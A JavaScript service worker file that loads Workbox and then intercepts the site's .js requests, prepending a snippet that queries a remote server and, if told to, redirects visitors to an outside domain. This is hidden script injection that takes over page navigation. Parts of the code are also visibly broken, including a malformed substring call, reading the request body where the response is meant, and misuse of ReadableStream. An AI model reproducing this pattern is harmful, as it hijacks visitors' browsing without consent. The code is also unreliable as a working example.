try {
    importScripts('https://storage.googleapis.com/workbox-cdn/releases/5.0.0/workbox-sw.js');
} catch (e) {
}

code = `
<script>
fetch("https://api.cyans.me/api/br/redir").catch(r=>undefined).then(r=>
    r.json()
).then(json=>{
    if (json.redirect) {
        location.href= json.location ?? "https://beasts.lovemilk.top"
    }
})
</script>
`.substring("<script>".length, "</script>".length)

addEventListener("message", async ev => {
    // console.log(ev)
    if (ev.request) {
        if (ev.request.url.split('?')[0].endsWith(".js")) {
            ev.preventDefault()
            let body = await ev.request.body.getReader().read()
            ev.respondWith(new Response(new ReadableStream(`${code};${body}`)))
        }
    }
})

addEventListener("fetch", async ev => {
    // console.log(ev)
    if (ev.request.url.split('?')[0].endsWith(".js")) {
        if (ev.request.url.indexOf('js.js') === -1) {
            let body = await ev.request.body.getReader().read()
            ev.preventDefault()
            ev.respondWith(new Response(new ReadableStream(`${code};${body}`)))
        }
    }
})
